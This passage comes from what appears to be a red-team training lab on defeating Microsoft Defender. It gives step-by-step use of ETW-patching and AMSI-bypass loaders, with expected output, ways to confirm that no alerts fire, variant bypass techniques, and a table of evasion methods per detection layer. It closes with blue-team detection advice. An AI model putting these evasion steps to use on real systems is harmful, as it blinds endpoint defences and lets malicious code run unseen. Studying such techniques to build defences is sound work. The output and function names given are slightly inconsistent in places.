Defender scans both files when they hit the disk. Neither triggers a detection because their import tables are clean and no suspicious strings exist in the binaries.

### Step 3: Run the ETW Patch First

On the target (kimjongun, 192.168.10.100), open a Command Prompt and run:
```
cd C:\Users\kimjongun\Desktop
etw_patch.exe
```

Expected output:
```
[*] Telemetry Patcher
[*] Method: NtTraceEvent indirect-syscall patch (single byte)
[*] VirtualProtect is NOT imported in this binary.

[+] ntdll base: 0x7FFE12340000
[+] Syscall gadget at: 0x7FFE12345100
[+] Stub memory at: 0x1A2B3C4D5E60
[+] NtProtectVirtualMemory stub built
[+] NtTraceEvent at: 0x7FFE1234ABCD
[+] Memory changed to RW
[+] Patch applied: single byte ret at NtTraceEvent
[+] Page protection restored to original

[+] ETW telemetry is now disabled in this process.
[+] No events will be written by this process.
[+] Monitoring products receive no activity from here.

[*] Run the scanner patch (Loader 04) next.
```

The actual memory addresses will be different on your system. The important lines are "[+] Patch applied: single byte ret at NtTraceEvent" and "[+] Page protection restored to original", which confirm the patch was written and the cleanup was done.

**Remember:** This patch only affects the etw_patch.exe process. Once it exits, the patch is gone. This standalone run is for testing and learning. In a real operation, you would integrate the patch function into your main loader (which is what Loader 08 does in Document 10).

### Step 4: Run the AMSI Bypass

On the target (kimjongun, 192.168.10.100), in a new Command Prompt window:
```
cd C:\Users\kimjongun\Desktop
amsi_bypass.exe
```

Expected output:
```
[*] Scanner Patch Loader
[*] Method: AmsiScanBuffer indirect-syscall patch (single byte)
[*] VirtualProtect is NOT imported in this binary.

[+] ntdll base: 0x7FFE12340000
[+] Syscall gadget at: 0x7FFE12345100
[+] NtProtectVirtualMemory stub built
[+] amsi.dll at: 0x7FFE98760000
[+] AmsiScanBuffer at: 0x7FFE98765432
[+] Memory changed to RW
[+] Patch applied: single byte ret at AmsiScanBuffer
[+] Page protection restored

[+] Scanner is now disabled in this process.
[+] .NET assemblies loaded here will not be inspected.
```

Again, the actual addresses will vary. The key confirmation is that amsi.dll was found, AmsiScanBuffer was located, and the patch was applied.

### Step 5: Test the AMSI Bypass (Optional but Recommended)

To verify that the AMSI patch actually works, you can test it with a PowerShell string that Defender normally blocks. This requires a more complex test setup because the AMSI patch only works in the process that applied it. Running amsi_bypass.exe and then opening a separate PowerShell window does not help because the new PowerShell process has its own unpatched copy of amsi.dll.

The proper way to test is to use the assembly loading feature. If you have a .NET red team tool (a compiled .exe that Defender normally blocks), you can load it through amsi_bypass.exe:

```
amsi_bypass.exe C:\Users\kimjongun\Desktop\some_tool.exe
```

The tool will load and run inside the amsi_bypass.exe process where AMSI is patched, so Defender will not scan it. If you ran the same tool directly (double-clicking it or running it from cmd), AMSI would scan it and potentially block it.

For now, confirming the patch applied without errors is sufficient. Document 10 integrates the AMSI and ETW patches into the combined evasion loader where you will see the full effect.

## Confirming Success

For each loader, confirm three things:

### ETW Patch (Loader 07):
1. **Output shows "[+] Patch applied: single byte ret at NtTraceEvent"** and **"[+] Page protection restored to original"**. This confirms the patch was written and cleaned up.
2. **No Defender alerts.** Open Windows Security on the target (kimjongun). Go to Virus & threat protection, then Protection history. There should be no entries for Loader07.exe.
3. **The process ran to completion without crashing.** If the process crashes after patching, the function address was wrong or the SSN read failed. A successful patch means NtTraceEvent's first byte was correctly overwritten and the process continued running normally.

### AMSI Bypass (Loader 04):
1. **Output shows "[+] Patch applied to AmsiScanBuffer"** and **"[+] Memory protection restored"**. Same confirmation as above.
2. **No Defender alerts.** No entries in Protection history for amsi_bypass.exe.
3. **If you loaded a .NET assembly through the loader**, it ran without AMSI blocking it. If the assembly ran and produced output, AMSI was successfully disabled.

### Verification with ETW Logging (Advanced)

If you want to confirm that the ETW patch actually stopped events from being generated, you can check with the built-in Windows logman tool before and after patching. This is optional and not needed for the curriculum, but it confirms the patch works at the system level.

On the target (kimjongun), before running the ETW patch, open a PowerShell window and run:
```powershell
logman query providers | Select-String "Microsoft-Windows-DotNETRuntime"
```

This shows that the .NET ETW provider is registered and active. After the ETW patch is applied (in the same process), events from that process to this provider will stop. The provider is still registered (logman will still show it), but EtwEventWrite in the patched process will not send events to it.

## What Was Gained

After this document, you can:

- Explain what ETW is and why Defender uses it to detect malicious behavior
- Explain what AMSI is and how it scans .NET code and PowerShell commands at runtime
- Patch EtwEventWrite to stop your process from generating telemetry
- Patch AmsiScanBuffer to stop your process from scanning loaded code
- Build function names and DLL names from integer offsets to avoid static signatures
- Use an indirect NtProtectVirtualMemory syscall stub to make code memory writable without importing VirtualProtect
- Understand why ETW must be patched before AMSI (to prevent the AMSI patch from being logged)

Combined with what you learned in previous documents, you have now addressed five of Defender's six detection layers:

| Layer | How it is addressed | Which document/loader |
|---|---|---|
| Static file scanning | XOR encryption of shellcode | Document 06, Loader 02 |
| Import table analysis | Dynamic resolution via GetProcAddress | Document 07, Loader 03 |
| AMSI runtime scanning | Patching AmsiScanBuffer | This document, Loader 04 |
| ETW telemetry | Patching NtTraceEvent | This document, Loader 07 |
| Behavioral ML | Two-step allocation, clean imports | Document 07, Loader 03 |
| API hooks in ntdll.dll | Not yet addressed | Document 09 (partial), Document 10 (combined) |

Document 09 teaches process injection techniques (Loader 05 and Loader 06) that let you execute code inside other processes. Document 10 combines everything into Loader 08, which patches ETW, patches AMSI, and executes shellcode with dynamic resolution in a single binary that survives Defender completely.

## Common Threats and Variations

### Variation 1: Patching AmsiOpenSession Instead of AmsiScanBuffer

AmsiScanBuffer is the most commonly patched function, and because of that, some security products specifically watch for modifications to it. An alternative target is AmsiOpenSession, which is the function that initializes an AMSI scanning session. If you patch AmsiOpenSession to return an error, no scanning session is ever opened, so AmsiScanBuffer is never called.

The patch bytes are similar: set EAX to an error code and return. The difference is that you target a different function address. Some red team tools use AmsiOpenSession patching because fewer detection rules target it compared to AmsiScanBuffer.

When this variation would fail: if a security product monitors both functions for modifications, patching either one triggers detection.

### Variation 2: Overwriting the AMSI Context Structure

Instead of patching the function code, you can corrupt the AMSI context structure in memory. Every AMSI-enabled process has a context object (AMSI_CONTEXT) that stores the state of the AMSI interface. If you overwrite the context with invalid data, every call to AmsiScanBuffer fails because the context it receives is corrupted. The function returns an error without scanning.

The benefit is that you are not modifying executable code, which is what most integrity checks look for. You are modifying a data structure, which is harder to detect. The downside is that the context structure's layout can change between Windows updates, so the offset you need to corrupt may differ.

### Variation 3: Patching ETW via NtTraceEvent Instead of EtwEventWrite

EtwEventWrite is the high-level ETW function in ntdll.dll. Under it, there is a lower-level function called NtTraceEvent that actually performs the kernel transition. Patching NtTraceEvent instead of EtwEventWrite covers more ground because there are other ETW functions (EtwEventWriteEx, EtwEventWriteFull, EtwEventWriteTransfer) that all go through NtTraceEvent. Patching at the NtTraceEvent level disables all of them.

The risk is that NtTraceEvent is a lower-level function that is used by more components. Patching it could cause stability issues in some processes that rely on ETW for their own internal logging (not security-related).

## Detection and Defense (Blue Team Perspective)

**Monitor for VirtualProtect calls on system DLL code sections.** When a process calls VirtualProtect on a memory region that belongs to ntdll.dll or amsi.dll, that is a strong signal of function patching. Legitimate programs almost never modify system DLL code in their own process.

Blue team action: configure your EDR to alert when VirtualProtect is called with a target address inside ntdll.dll or amsi.dll and the new protection includes write permissions (PAGE_READWRITE or PAGE_EXECUTE_READWRITE).

**Verify AMSI integrity at runtime.** Microsoft provides the AmsiInitialize API that security products can call to verify that the AMSI interface is working correctly. A security product can periodically call AmsiScanBuffer with a known-malicious test string (the EICAR test string) and check that the result is "malicious". If the result is "clean" or an error, AMSI has been tampered with.

Blue team action: deploy an agent that periodically tests AMSI functionality in running processes. If AMSI stops detecting the test string in a process, flag that process for investigation.

**Use kernel-mode ETW providers.** The user-mode EtwEventWrite patch does not affect kernel-mode ETW providers. The Microsoft-Windows-Threat-Intelligence provider runs in the kernel and logs events like process creation, image loads, and virtual memory operations from kernel space. These events cannot be suppressed from user mode.

Blue team action: deploy EDR products that consume kernel-mode ETW events (via the Threat Intelligence provider) rather than relying solely on user-mode telemetry. This defeats the user-mode ETW patch.

**Compare ntdll.dll in memory against the on-disk copy.** Defender and some EDR products periodically compare the loaded copy of ntdll.dll in a process against the file on disk. If the in-memory copy has been modified (bytes differ from the disk copy), the process is flagged. This technique catches both the ETW and AMSI patches.

Blue team action: enable or deploy DLL integrity checking that compares in-memory DLL code sections against the on-disk originals. Alert on any differences in ntdll.dll or amsi.dll.

## What Comes Next

Document 09 (lab/materials/09_reflective_injection.md) teaches process injection. Loader 05 (reflective DLL injector) and Loader 06 (Early Bird APC injection) let you execute code inside another process's memory space. These techniques let your malicious code run under the identity of a legitimate process (like explorer.exe or svchost.exe), which makes it harder for Defender to distinguish your code from legitimate process behavior. Document 09 covers techniques that Defender catches when used alone, but that become powerful when combined with the patches from this document.
